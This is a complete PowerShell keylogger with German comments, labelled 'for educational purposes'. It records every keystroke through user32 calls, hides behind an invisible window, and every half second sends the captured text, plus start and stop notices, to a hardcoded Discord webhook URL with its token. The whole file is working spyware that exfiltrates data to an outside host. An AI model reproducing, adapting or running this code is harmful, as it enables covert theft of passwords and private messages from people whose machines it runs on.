# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (robuster für deutsches Layout, für Bildungszwecke)

# Erzwinge STA-Thread für Forms
[System.Threading.Thread]::CurrentThread.ApartmentState = 'STA'

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Collections.Generic;

public static class KeyLogger
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    private static StringBuilder _buffer = new StringBuilder();
    private static string _hookUrl;
    private static Dictionary<int, bool> _keyStates = new Dictionary<int, bool>();

    public static void Initialize(string hookUrl)
    {
        _hookUrl = hookUrl;
    }

    public static void CheckKeys()
    {
        for (int vk = 0x01; vk <= 0xFE; vk++)
        {
                  bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
            bool caps = System.Windows.Forms.Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
            bool isPressed = (GetAsyncKeyState(vk) & 0x8000) != 0;

                        if (isPressed && !(_keyStates.ContainsKey(vk) && _keyStates[vk]))
            {
                string key = GetKeyString(vk);
                _buffer.Append(key);
            }

            _keyStates[vk] = isPressed;
        }
    }

    private static string GetKeyString(int vkCode)
    {
        byte[] keyState = new byte[256];
        GetKeyboardState(keyState);

        StringBuilder sb = new StringBuilder(10);
        IntPtr hkl = GetKeyboardLayout(0);
        int result = ToUnicodeEx((uint)vkCode, 0, keyState, sb, sb.Capacity, 0, hkl);

        if (result > 0)
        {
            return sb.ToString();
        }
        else
        {
            // Special-Keys handhaben
            string keyDesc = "";
            switch (vkCode)
            {
                case 0x08: keyDesc = "[BACKSPACE]"; break;
                case 0x09: keyDesc = "[TAB]"; break;
                case 0x0D: keyDesc = "[ENTER]"; break;
                case 0x1B: keyDesc = "[ESC]"; break;
                case 0x20: keyDesc = " "; break;
                case 0x2E: keyDesc = "[DELETE]"; break;
                // Füge mehr hinzu, z.B. Pfeiltasten, F-Keys, etc., falls nötig
                default: keyDesc = $"[VK:{vkCode:X2}]"; break;
            }
            return keyDesc;
        }
    }

    public static void SendBuffer()
    {
        if (_buffer.Length > 0)
        {
            string content = _buffer.ToString();
            if (content.Length > 1900)
            {
                content = content.Substring(0, 1900);
                _buffer.Remove(0, 1900);
            }
            else
            {
                _buffer.Clear();
            }
            try
            {
                using (var client = new System.Net.WebClient())
                {
                    client.Headers.Add("Content-Type", "application/json");
                    string payload = "{\"content\":\"" + content.Replace("\"", "\\\"") + "\"}";
                    client.UploadString(_hookUrl, "POST", payload);
                }
            }
            catch {}
        }
    }
}
"@

$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

[KeyLogger]::Initialize($hookUrl)
$timeout = 120 # Sekunden

# Timer für Key-Check (alle 10ms)
$checkTimer = New-Object System.Windows.Forms.Timer
$checkTimer.Interval = 10
$checkTimer.add_Tick({ [KeyLogger]::CheckKeys() })
$checkTimer.Start()

# Timer für Send (alle 500ms)
$sendTimer = New-Object System.Windows.Forms.Timer
$sendTimer.Interval = 500
$sendTimer.add_Tick({ [KeyLogger]::SendBuffer() })
$sendTimer.Start()

# Unsichtbare Form für Message-Loop
$form = New-Object System.Windows.Forms.Form
$form.ShowInTaskbar = $false
$form.WindowState = 'Minimized'
$form.Opacity = 0
$form.add_Load({
    $timeoutTimer = New-Object System.Timers.Timer
    $timeoutTimer.Interval = $timeout * 1000
    $timeoutTimer.add_Elapsed({
        $checkTimer.Stop()
        $sendTimer.Stop()
        [KeyLogger]::SendBuffer()  # Rest senden
        [System.Windows.Forms.Application]::Exit()
    })
    $timeoutTimer.Start()
})
[System.Windows.Forms.Application]::Run($form)

# Logger-Ende an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}